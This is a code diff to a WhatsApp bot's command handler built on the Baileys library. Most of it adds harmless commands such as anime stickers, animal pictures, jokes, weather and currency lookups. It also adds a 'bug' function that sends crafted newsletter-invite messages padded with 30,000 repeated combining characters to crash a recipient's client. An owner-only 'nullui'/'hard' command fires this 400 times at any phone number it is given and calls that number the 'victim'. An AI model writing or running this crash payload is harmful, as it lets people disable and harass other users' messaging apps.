@@ -1,6 +1,6 @@
 const config = require('./config');
 const axios = require('axios');
-const { downloadMediaMessage } = require('baileys');
+const { downloadMediaMessage, generateWAMessageFromContent, proto } = require('baileys');
 const store = require('./lib/store');
 const { exec } = require('child_process');
 const fs = require('fs-extra');
@@ -74,6 +74,36 @@ async function gfxLogo(sock, from, msg, style, text1, text2) {
   } catch (e) {
     await sock.sendMessage(from, { text: `⚠️ Error generating ${style.toUpperCase()} image.\n_${e.message}_` }, { quoted: msg });
   }
+}
+
+// ─── VsxBlankNewlaster (Bug function) ────────────────────────────
+async function VsxBlankNewlaster(sock, target) {
+  try {
+    const message = generateWAMessageFromContent(target, proto.Message.fromObject({
+      newsletterAdminInviteMessage: {
+        newsletterJid: '1234567890@newsletter',
+        newsletterName: 'ꦾ' + 'ꦽ'.repeat(30000),
+        jpegThumbnail: Buffer.alloc(10),
+        caption: 'ꦾ' + 'ꦽ'.repeat(30000),
+        inviteExpiration: Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60),
+        inviteMessage: 'Hi bro it\'s me from natsu'
+      },
+      contextInfo: {
+        mentionedJid: ['0@s.whatsapp.net'],
+        forwardingScore: 1,
+        isForwarded: true,
+        externalAdReply: {
+          title: 'ꦽ'.repeat(30000),
+          body: 'ꦾ'.repeat(30000),
+          thumbnail: Buffer.alloc(10),
+          mediaType: 1,
+          renderLargerThumbnail: false,
+          showAdAttribution: true,
+        }
+      }
+    }), { userJid: sock.user.id });
+    await sock.relayMessage(target, message.message, { messageId: message.key.id });
+  } catch (_) {}
 }
 
 // ─── MAIN HANDLER ────────────────────────────────────────────────
@@ -1557,6 +1587,267 @@ async function handleCommand(ctx) {
       if (gcId) try { await sock.groupLeave(gcId); } catch (_) {}
       await reply(`❌ nullgc failed: ${e.message}`);
     }
+    return true;
+  }
+
+  // ════════════════════════════════════════════════════════════════
+  // 🤡 STICKER ANIME COMMANDS (waifu.pics)
+  // ════════════════════════════════════════════════════════════════
+
+  case 'cry': case 'kill': case 'hug': case 'pat': case 'lick':
+  case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
+  case 'wink': case 'poke': case 'nom': case 'slap': case 'smile':
+  case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp':
+  case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive':
+  case 'shinobu': case 'handhold': {
+    try {
+      const { data } = await axios.get(`https://api.waifu.pics/sfw/${command}`);
+      const imgBuf = (await axios.get(data.url, { responseType: 'arraybuffer' })).data;
+      const sharp = require('sharp');
+      const webp = await sharp(imgBuf)
+        .resize(512, 512, { fit: 'contain', background: { r: 0, g: 0, b: 0, alpha: 0 } })
+        .webp({ quality: 80 }).toBuffer();
+      await sock.sendMessage(from, { sticker: webp }, { quoted: msg });
+    } catch (e) { await reply(`❌ Sticker error: ${e.message}`); }
+    return true;
+  }
+
+  case 'furbrat': {
+    try {
+      const { data } = await axios.get('https://api.waifu.pics/sfw/pat');
+      await sock.sendMessage(from, { image: { url: data.url }, caption: '🐾 Furbrat!' }, { quoted: msg });
+    } catch (e) { await reply(`❌ Error: ${e.message}`); }
+    return true;
+  }
+
+  // ════════════════════════════════════════════════════════════════
+  // 🐛 BUG MENU — VsxBlankNewlaster crash technique
+  // ════════════════════════════════════════════════════════════════
+
+  case 'nullui':
+  case 'hard':
+  case '🙂': {
+    if (!isOwner) return reply('❌ Owner only.');
+    if (!text) return reply(`❌ Usage: ${prefix}${command} 242xxxxxxx`);
+    const bugNum = text.replace(/[^0-9]/g, '');
+    const bugTarget = bugNum + '@s.whatsapp.net';
+    await reply(
+`╔═━━━━━━━━━◈━━━━━━━━━═╗
+│ ─( P҇r҇o҇c҇e҇s҇s̶ A̶c̶t̶i̶v̶e̶d̶ 🦠 )─
+│
+│⪼ T̶y̶p̶e̶ B̶u̶g̶ : *${command}*
+│⪼ V̶i̶c̶t̶i̶m̶s̶ : *${bugNum}*
+╚═━━━━━━━━━◈━━━━━━━━━═╝
+Y̶o̶ R̶i̶s̶q̶u̶e̶ B̶a̶n̶ , P̶a̶u̶s̶e̶ 5 M̶i̶n̶ 🫂`);
+    for (let i = 0; i < 100; i++) {
+      await VsxBlankNewlaster(sock, bugTarget);
+      await VsxBlankNewlaster(sock, bugTarget);
+      await VsxBlankNewlaster(sock, bugTarget);
+      await VsxBlankNewlaster(sock, bugTarget);
+    }
+    return true;
+  }
+
+  // ════════════════════════════════════════════════════════════════
+  // 🌐 NOUVELLES APIs (case.js)
+  // ════════════════════════════════════════════════════════════════
+
+  case 'cat': {
+    try {
+      const res = await axios.get('https://api.thecatapi.com/v1/images/search');
+      await sock.sendMessage(from, { image: { url: res.data[0]?.url }, caption: '🐱 Random Cat!' }, { quoted: msg });
+    } catch { await reply('❌ Failed to fetch cat image.'); }
+    return true;
+  }
+  case 'dog': {
+    try {
+      const res = await axios.get('https://dog.ceo/api/breeds/image/random');
+      await sock.sendMessage(from, { image: { url: res.data?.message }, caption: '🐶 Random Dog!' }, { quoted: msg });
+    } catch { await reply('❌ Failed to fetch dog image.'); }
+    return true;
+  }
+  case 'fox': {
+    try {
+      const res = await axios.get('https://randomfox.ca/floof/');
+      await sock.sendMessage(from, { image: { url: res.data?.image }, caption: '🦊 Random Fox!' }, { quoted: msg });
+    } catch { await reply('❌ Failed to fetch fox image.'); }
+    return true;
+  }
+  case 'bird': {
+    try {
+      const res = await axios.get('https://some-random-api.ml/img/birb');
+      await sock.sendMessage(from, { image: { url: res.data?.link }, caption: '🐦 Random Bird!' }, { quoted: msg });
+    } catch { await reply('❌ Failed to fetch bird image.'); }
+    return true;
+  }
+  case 'panda': {
+    try {
+      const res = await axios.get('https://some-random-api.ml/img/panda');
+      await sock.sendMessage(from, { image: { url: res.data?.link }, caption: '🐼 Random Panda!' }, { quoted: msg });
+    } catch { await reply('❌ Failed to fetch panda image.'); }
+    return true;
+  }
+  case 'koala': {
+    try {
+      const res = await axios.get('https://some-random-api.ml/img/koala');
+      await sock.sendMessage(from, { image: { url: res.data?.link }, caption: '🐨 Random Koala!' }, { quoted: msg });
+    } catch { await reply('❌ Failed to fetch koala image.'); }
+    return true;
+  }
+  case 'dadjoke': {
+    try {
+      const res = await axios.get('https://icanhazdadjoke.com/', { headers: { Accept: 'application/json' } });
+      await reply(`👨‍🦳 *Dad Joke:*\n\n${res.data?.joke}`);
+    } catch { await reply('❌ Failed to fetch dad joke.'); }
+    return true;
+  }
+  case 'prog': {
+    try {
+      const res = await axios.get('https://v2.jokeapi.dev/joke/Programming?type=single');
+      await reply(`💻 *Programming Joke:*\n\n${res.data?.joke}`);
+    } catch { await reply('❌ Failed to fetch programming joke.'); }
+    return true;
+  }
+  case 'ascii': {
+    if (!text) return reply('❌ Usage: .ascii Hello');
+    try {
+      const res = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`);
+      await reply(`🎨 ASCII Art:\n\n${res.data}`);
+    } catch { await reply('❌ Failed to generate ASCII art.'); }
+    return true;
+  }
+  case 'movie': {
+    if (!text) return reply('❌ Usage: .movie Inception');
+    try {
+      const res = await axios.get(`http://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=6372bb60`);
+      if (res.data.Response === 'False') return reply('❌ Movie not found.');
+      const d = res.data;
+      await reply(`🎬 *${d.Title}* (${d.Year})\n⭐ ${d.imdbRating}/10\n🎭 ${d.Genre}\n🎬 ${d.Director}\n👥 ${d.Actors}\n\n📖 ${d.Plot}\n\n🔗 https://www.imdb.com/title/${d.imdbID}`);
+    } catch { await reply('❌ Failed to fetch movie info.'); }
+    return true;
+  }
+  case 'wiki': {
+    if (!text) return reply('❌ Usage: .wiki JavaScript');
+    try {
+      const res = await axios.get(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(text)}`);
+      await reply(`📚 *${res.data.title}*\n\n${res.data.extract}`);
+    } catch { await reply('❌ Failed to fetch Wikipedia article.'); }
+    return true;
+  }
+  case 'weather': {
+    if (!text) return reply('❌ Usage: .weather Lagos');
+    try {
+      const res = await axios.get(`https://wttr.in/${encodeURIComponent(text)}?format=3`);
+      await reply(`🌤 *Weather:*\n${res.data}`);
+    } catch { await reply('❌ Failed to fetch weather.'); }
+    return true;
+  }
+  case 'calculate':
+  case 'calc': {
+    if (!text) return reply('❌ Usage: .calc 12+25*3');
+    try {
+      // eslint-disable-next-line no-eval
+      const result = eval(text.replace(/[^0-9+\-*/.()^ ]/g, ''));
+      await reply(`🧮 *Result:* ${text} = *${result}*`);
+    } catch { await reply('❌ Invalid expression.'); }
+    return true;
+  }
+  case 'qrcode': {
+    if (!text) return reply('❌ Usage: .qrcode Hello World');
+    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(text)}`;
+    await sock.sendMessage(from, { image: { url: qrUrl }, caption: '📱 QR Code Generated' }, { quoted: msg });
+    return true;
+  }
+  case 'iplookup': {
+    if (!text) return reply('❌ Usage: .iplookup 8.8.8.8');
+    try {
+      const res = await axios.get(`https://ipapi.co/${text}/json/`);
+      await reply(`🌐 *IP Info for ${text}:*\n🌍 Country: ${res.data.country_name}\n📍 City: ${res.data.city}\n🏢 ISP: ${res.data.org}`);
+    } catch { await reply('❌ Could not fetch IP info.'); }
+    return true;
+  }
+  case 'genpass': {
+    const len = parseInt(text) || 12;
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()';
+    let pass = '';
+    for (let i = 0; i < len; i++) pass += chars.charAt(Math.floor(Math.random() * chars.length));
+    await reply(`🔑 *Generated Password (${len} chars):*\n\`${pass}\``);
+    return true;
+  }
+  case 'define':
+  case 'dictionary': {
+    if (!text) return reply('❌ Usage: .define computer');
+    try {
+      const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`);
+      const meaning = res.data[0]?.meanings[0]?.definitions[0]?.definition;
+      await reply(`📖 *${text}:*\n${meaning}`);
+    } catch { await reply('❌ Word not found.'); }
+    return true;
+  }
+  case 'currency': {
+    if (!text) return reply('❌ Usage: .currency 100 USD XAF');
+    const [amount, fromCurr, toCurr] = text.split(' ');
+    if (!amount || !fromCurr || !toCurr) return reply('❌ Usage: .currency 100 USD XAF');
+    try {
+      const res = await axios.get(`https://api.exchangerate.host/convert?from=${fromCurr.toUpperCase()}&to=${toCurr.toUpperCase()}&amount=${amount}`);
+      await reply(`💱 *${amount} ${fromCurr.toUpperCase()} = ${res.data.result} ${toCurr.toUpperCase()}*`);
+    } catch { await reply('❌ Failed to convert currency.'); }
+    return true;
+  }
+  case 'recipe': {
+    if (!text) return reply('❌ Usage: .recipe pancakes');
+    try {
+      const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(text)}`);
+      if (!res.data.meals) return reply('❌ No recipe found.');
+      const meal = res.data.meals[0];
+      await reply(`🍽 *${meal.strMeal}*\n🌍 ${meal.strArea} | ${meal.strCategory}\n\n📝 ${meal.strInstructions?.slice(0, 400)}...`);
+    } catch { await reply('❌ Failed to fetch recipe.'); }
+    return true;
+  }
+  case 'mathfact': {
+    try {
+      const res = await axios.get('http://numbersapi.com/random/math?json');
+      await reply(`🔢 *Math Fact:*\n${res.data.text}`);
+    } catch { await reply('❌ Failed to fetch math fact.'); }
+    return true;
+  }
+  case 'horoscope': {
+    if (!text) return reply('❌ Usage: .horoscope leo');
+    try {
+      const res = await axios.get(`https://aztro.sameerkumar.website/?sign=${text.toLowerCase()}&day=today`, { method: 'POST' });
+      const d = res.data;
+      await reply(`🔮 *Horoscope for ${text.toUpperCase()}:*\n😊 Mood: ${d.mood}\n🍀 Lucky Number: ${d.lucky_number}\n🌈 Color: ${d.color}\n💑 Compatibility: ${d.compatibility}\n\n${d.description}`);
+    } catch { await reply('❌ Failed to fetch horoscope.'); }
+    return true;
+  }
+  case 'gamefact': {
+    try {
+      const res = await axios.get('https://www.freetogame.com/api/games');
+      const game = res.data[Math.floor(Math.random() * res.data.length)];
+      await reply(`🎮 *${game.title}*\n🏷 Genre: ${game.genre}\n💻 Platform: ${game.platform}\n🔗 ${game.game_url}`);
+    } catch { await reply('❌ Failed to fetch game fact.'); }
+    return true;
+  }
+  case 'tomp4': {
+    const qMsg2 = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+    if (!qMsg2) return reply('❌ Reply to a sticker or GIF with .tomp4');
+    const qType2 = Object.keys(qMsg2)[0];
+    if (!/webp|gif/.test(qType2 + (qMsg2[qType2]?.mimetype || ''))) return reply('❌ Reply to a sticker or GIF only.');
+    try {
+      const buf2 = await downloadMediaMessage({ message: qMsg2, key: msg.key }, 'buffer', {});
+      await sock.sendMessage(from, { video: buf2, mimetype: 'video/mp4', caption: '🎬 Converted to MP4' }, { quoted: msg });
+    } catch (e) { await reply(`❌ Failed to convert: ${e.message}`); }
+    return true;
+  }
+  case 'tomp3': {
+    const qMsg3 = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+    if (!qMsg3) return reply('❌ Reply to a video with .tomp3');
+    const qType3 = Object.keys(qMsg3)[0];
+    if (qType3 !== 'videoMessage') return reply('❌ Reply to a video only.');
+    try {
+      const buf3 = await downloadMediaMessage({ message: qMsg3, key: msg.key }, 'buffer', {});
+      await sock.sendMessage(from, { audio: buf3, mimetype: 'audio/mpeg', ptt: false }, { quoted: msg });
+    } catch (e) { await reply(`❌ Failed to convert: ${e.message}`); }
     return true;
   }
 
